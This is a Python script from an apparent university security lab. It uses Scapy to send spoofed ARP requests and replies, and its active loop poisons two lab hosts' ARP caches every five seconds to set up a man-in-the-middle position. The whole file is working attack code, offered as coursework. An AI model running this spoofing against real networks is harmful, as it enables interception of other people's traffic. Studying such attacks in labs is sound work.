# File: packetBuilder.py
# Author: Caleb M. McLaren
# email: mclaren1@umbc.edu
# date: April 21, 2021
# description: this file must import Scapy library, construct, and send spoofed ARP
# 	packets.

targetIface = 'br-6a6634287396'
hostAIP = '10.9.0.5'
hostBIP = '10.9.0.6'
hostrMIP = '10.9.0.105'

blancMAC = 'ff:ff:ff:ff:ff:ff'
hostAMAC = '02:42:0a:09:00:05'
hostBMAC = '02:42:0a:09:00:06'
hostMMAC = '02:42:0a:09:00:69'

SEND = 1
REPLY = 2
INTERVAL = 5

from scapy.all import * 
import time

""" # Task 1.A
# Lie to host A about IP and MAC pair
E = Ether(dst=blancMAC, src=hostMMAC)
A = ARP(op=SEND, hwsrc=hostMMAC, psrc=hostBIP, pdst=hostAIP)

pkt = E/A
ls(pkt)
sendp(pkt)
#sendp(pkt, iface=targetIface)
 """

""" # Reset host A's ARP table
E = Ether(dst=blancMAC, src=hostMMAC)
A = ARP(op=SEND, hwsrc=hostBMAC, psrc=hostBIP, pdst=hostAIP)

pkt = E/A
ls(pkt)
sendp(pkt)
 """

 
""" # Task 1.B
# Scenario 1: host B's ip is already in host A's cashe
E = Ether(dst=blancMAC, src=hostMMAC)
A = ARP(op=REPLY, hwsrc=hostMMAC, psrc=hostBIP, pdst=hostAIP)

pkt = E/A
ls(pkt)
sendp(pkt)
 """

""" # Task 1.C
E = Ether(dst=blancMAC, src=hostMMAC)
A = ARP(op=REPLY, hwsrc=hostMMAC, psrc=hostBIP, hwdst=blancMAC)

pkt = E/A
ls(pkt)
sendp(pkt)
 """

 # Task 2 step 1
# host B's ip is already in host A's cache
# host A's ip is alreadin host B's cache

while ( True ):
    ##############
    E = Ether(dst=blancMAC, src=hostMMAC)
    A = ARP(op=REPLY, hwsrc=hostMMAC, psrc=hostBIP, pdst=hostAIP)

    pkt = E/A
    ls(pkt)
    sendp(pkt)
    
    ##############
    E = Ether(dst=blancMAC, src=hostMMAC)
    A = ARP(op=REPLY, hwsrc=hostMMAC, psrc=hostAIP, pdst=hostBIP)

    pkt = E/A
    ls(pkt)
    sendp(pkt)

    time.sleep ( INTERVAL )



